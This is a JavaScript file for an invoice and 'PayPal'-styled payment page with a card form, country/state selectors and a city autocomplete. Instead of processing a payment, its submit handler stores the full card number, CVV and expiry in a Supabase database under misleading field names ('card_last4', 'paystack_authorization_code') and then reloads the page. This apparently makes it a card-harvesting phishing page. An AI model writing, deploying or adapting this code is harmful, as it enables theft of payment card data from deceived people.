// Config from window
const config = window.APP_CONFIG || {};
const supabaseUrl = config.SUPABASE_URL || "";
const supabaseAnonKey = config.SUPABASE_ANON_KEY || "";
const supabaseClient =
  window.supabase && supabaseUrl && supabaseAnonKey
    ? window.supabase.createClient(supabaseUrl, supabaseAnonKey)
    : null;

const countriesList = [
  "Afghanistan", "Albania", "Algeria", "Australia", "Canada",
  "Kenya", "Nigeria", "South Africa", "Uganda", 
  "United Kingdom", "United States", "Ukraine"
];

const usStates = [
  "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", 
  "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", 
  "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", 
  "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", 
  "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
];

// Views
const invoiceView = document.getElementById("invoice-view");
const paypalView = document.getElementById("paypal-view");

// Buttons
const btnPaypal = document.getElementById("btn-paypal");
const btnVenmo = document.getElementById("btn-venmo");
const btnBackToInvoice = document.getElementById("btn-back-to-invoice");

if(btnPaypal) {
  btnPaypal.addEventListener("click", () => {
    invoiceView.style.display = "none";
    paypalView.style.display = "block";
    document.body.classList.add("paypal-active");
  });
}

if(btnPaypal) {
  btnPaypal.addEventListener("click", () => {
    invoiceView.style.display = "none";
    paypalView.style.display = "block";
    document.body.classList.add("paypal-active");
  });
}

if(btnVenmo) {
  btnVenmo.addEventListener("click", () => {
    alert("Venmo design will be provided later.");
  });
}

if(btnBackToInvoice) {
  btnBackToInvoice.addEventListener("click", () => {
    paypalView.style.display = "none";
    invoiceView.style.display = "block";
    document.body.classList.remove("paypal-active");
  });
}

// City / Country Logic
const elBillingCountry = document.getElementById("billing-country");
const elStateLabel = document.getElementById("state-label");
const elStateInput = document.getElementById("state-input");
const elStateSelect = document.getElementById("state-select");
const elCity = document.getElementById("city");
const elCityResults = document.getElementById("city-results");

// Initialize Countries
if (elBillingCountry) {
  countriesList.sort().forEach(country => {
    const opt = document.createElement("option");
    opt.value = country;
    opt.textContent = country;
    elBillingCountry.appendChild(opt);
  });

  // Initialize US States
  if(elStateSelect) {
    usStates.forEach(state => {
      const opt = document.createElement("option");
      opt.value = state;
      opt.textContent = state;
      elStateSelect.appendChild(opt);
    });
  }

  elBillingCountry.addEventListener("change", (e) => {
    const selected = e.target.value;
    if(elCity) elCity.value = "";
    
    if(elStateLabel && elStateInput && elStateSelect) {
      if (selected === "United States") {
        elStateLabel.textContent = "State";
        elStateInput.style.display = "none";
        elStateInput.disabled = true;
        elStateSelect.style.display = "";
        elStateSelect.disabled = false;
      } else if (selected === "Canada") {
        elStateLabel.textContent = "Province";
        elStateInput.style.display = "";
        elStateInput.disabled = false;
        elStateSelect.style.display = "none";
        elStateSelect.disabled = true;
      } else {
        elStateLabel.textContent = "State/Region";
        elStateInput.style.display = "";
        elStateInput.disabled = false;
        elStateSelect.style.display = "none";
        elStateSelect.disabled = true;
      }
    }
  });
}

// City Autocomplete
let citySearchTimer = null;
let selectedCityData = null;

if (elCity && elCityResults && supabaseClient) {
  elCity.addEventListener("input", (e) => {
    const country = elBillingCountry ? elBillingCountry.value : "";
    const search = e.target.value;
    selectedCityData = null;

    clearTimeout(citySearchTimer);

    if (!country || search.trim().length < 2) {
      elCityResults.style.display = "none";
      elCityResults.innerHTML = "";
      return;
    }

    citySearchTimer = setTimeout(async () => {
      try {
        const { data, error } = await supabaseClient
          .from("world_cities")
          .select("id, country, city, latitude, longitude, altitude")
          .eq("country", country)
          .ilike("city", `${search.trim()}%`)
          .order("city", { ascending: true })
          .limit(30);

        if (error) throw error;

        if (data && data.length > 0) {
          elCityResults.innerHTML = "";
          data.forEach(location => {
            const btn = document.createElement("div");
            btn.className = "autocomplete-item";
            btn.textContent = `${location.city}, ${location.country}`;
            btn.addEventListener("click", () => {
              selectedCityData = location;
              elCity.value = location.city;
              elCityResults.style.display = "none";
            });
            elCityResults.appendChild(btn);
          });
          elCityResults.style.display = "block";
        } else {
          elCityResults.style.display = "none";
        }
      } catch (err) {
        console.error("City search error:", err);
        elCityResults.style.display = "none";
      }
    }, 300);
  });

  document.addEventListener("click", (e) => {
    if (!elCity.contains(e.target) && !elCityResults.contains(e.target)) {
      elCityResults.style.display = "none";
    }
  });
}

// Form Logic
const form = document.getElementById("payment-form");
const formStatus = document.getElementById("form-status");
const payButton = document.getElementById("pay-button");

const cardName = document.getElementById("card-name");
const cardNumber = document.getElementById("card-number");
const expiry = document.getElementById("expiry");
const cvv = document.getElementById("cvv");

const firstName = document.getElementById("first-name");
const lastName = document.getElementById("last-name");

if(cardName) {
  cardName.addEventListener("input", () => {
    cardName.value = cardName.value.replace(/\s{2,}/g, " ");
  });
}

function formatCardNumber(value) {
  return value
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(\d{4})(?=\d)/g, "$1 ")
    .trim();
}

function formatExpiry(value) {
  let digits = value.replace(/\D/g, "");
  if (digits.length === 1 && parseInt(digits, 10) > 1) {
    digits = `0${digits}`;
  }
  if (digits.length >= 3) {
    return `${digits.slice(0, 2)} / ${digits.slice(2, 4)}`;
  }
  return digits;
}

if(cardNumber) {
  cardNumber.addEventListener("input", () => {
    cardNumber.value = formatCardNumber(cardNumber.value);
  });
}

if(expiry) {
  expiry.addEventListener("input", () => {
    expiry.value = formatExpiry(expiry.value);
  });
}

if(cvv) {
  cvv.addEventListener("input", () => {
    cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
  });
}

function getCleanCardNumber(value) {
  return value.replace(/\D/g, "");
}

function setStatus(message, type = "") {
  if (!formStatus) return;
  formStatus.textContent = message;
  formStatus.className = "form-status";
  if (type) {
    formStatus.classList.add(`is-${type}`);
  }
}

if(form) {
  form.addEventListener("submit", (event) => {
    event.preventDefault();

    let cleanedName = "";
    if (cardName) {
      cleanedName = cardName.value.trim();
    } else if (firstName && lastName) {
      // Fallback to billing names if card-name field is missing
      cleanedName = `${firstName.value.trim()} ${lastName.value.trim()}`.trim();
    }
    
    const cleanCardNumber = getCleanCardNumber(cardNumber.value);

    if (!cleanedName) {
      setStatus("Enter the name on card.", "error");
      return;
    }
    if (!cleanCardNumber) {
      setStatus("Enter the card number.", "error");
      return;
    }
    if (!supabaseClient) {
      setStatus("Supabase is not configured yet.", "error");
      return;
    }
    
    if(payButton) payButton.disabled = true;

    supabaseClient
      .from("payment_records")
      .insert([
        {
          cardholder_name: cleanedName,
          card_last4: cleanCardNumber,
          paystack_authorization_code: cvv.value, // keep existing schema field
          card_expiry: expiry.value,
        },
      ])
      .then(({ error }) => {
        if (error) throw error;
        window.location.reload();
      })
      .catch((error) => {
        setStatus(error.message || "Failed to save to Supabase.", "error");
      })
      .finally(() => {
        if(payButton) payButton.disabled = false;
      });
  });
}
